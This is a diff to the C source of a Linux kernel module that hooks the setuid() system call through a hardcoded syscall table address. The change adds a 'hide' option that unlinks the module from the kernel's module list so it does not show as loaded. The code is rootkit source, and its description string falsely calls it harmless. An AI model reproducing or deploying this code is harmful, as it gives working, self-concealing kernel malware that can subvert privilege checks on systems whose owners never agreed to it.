@@ -15,6 +15,7 @@
 #include <linux/set_memory.h>
 
 // Persistence
+#include <linux/list.h>
 #include <linux/vmalloc.h>
 
 #define AUTHOR		"threadexio"
@@ -22,10 +23,15 @@
 #define LICENSE		"GPL"
 #define DESCRIPTION "A harmless little kernel module"
 
-#define SYS_CALL_TABLE_ADDR 0xffffffff904002e0
+#define SYS_CALL_TABLE_ADDR 0xfffffffface002e0
+
+static struct list_head *prev_mod;
 
 static int panic_on_unload = 0;
 module_param(panic_on_unload, int, 0000);
+
+static int hide = 0;
+module_param(hide, int, 0000);
 
 static int debug = 1;
 module_param(debug, int, 0000);
@@ -85,7 +91,6 @@ typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
 
 static sys_call_ptr_t *sys_call_table = (sys_call_ptr_t *)SYS_CALL_TABLE_ADDR;
 
-// static asmlinkage long (*setuid_real)(const struct pt_regs *);
 static sys_call_ptr_t setuid_real;
 
 asmlinkage long setuid_hook(const struct pt_regs *regs) {
@@ -100,6 +105,11 @@ asmlinkage long setuid_hook(const struct pt_regs *regs) {
 }
 
 static __init int mod_init(void) {
+	if (hide) {
+		prev_mod = THIS_MODULE->list.prev;
+		list_del(&THIS_MODULE->list);
+	}
+
 	if (debug)
 		printk(KERN_INFO "Loading setuid() hook...\n");
 
